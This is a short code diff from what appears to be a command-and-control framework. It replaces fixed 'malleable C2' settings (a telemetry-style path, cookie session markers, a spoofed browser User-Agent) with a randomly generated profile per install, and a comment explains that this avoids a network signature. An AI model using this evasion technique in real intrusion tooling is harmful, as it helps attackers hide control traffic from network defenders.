@@ -174,17 +174,10 @@ func InitConfigFile(cc_host string) (err error) {
 		live.RuntimeConfig.PollInterval = 60
 	}
 
-	// Malleable C2 Defaults
-	live.RuntimeConfig.MalleableC2.C2Path = "/api/v1/telemetry"
-	live.RuntimeConfig.MalleableC2.SessionHeader = "Cookie"
-	live.RuntimeConfig.MalleableC2.SessionValue = "sessionID=%s"
-	live.RuntimeConfig.MalleableC2.InitHeader = "Cookie"
-	live.RuntimeConfig.MalleableC2.InitValue = "init=1"
-	live.RuntimeConfig.MalleableC2.CloseHeader = "Cookie"
-	live.RuntimeConfig.MalleableC2.CloseValue = "close=1"
-	live.RuntimeConfig.MalleableC2.CustomHeaders = map[string]string{
-		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	}
+	// Malleable C2 defaults: a fixed profile is a network signature, so draw a
+	// fresh one for this install. It is persisted below and embedded in every
+	// agent, keeping the client and server in agreement.
+	live.RuntimeConfig.MalleableC2 = transport.RandomMalleableHTTPConfig()
 
 	// save
 	return SaveConfigJSON()
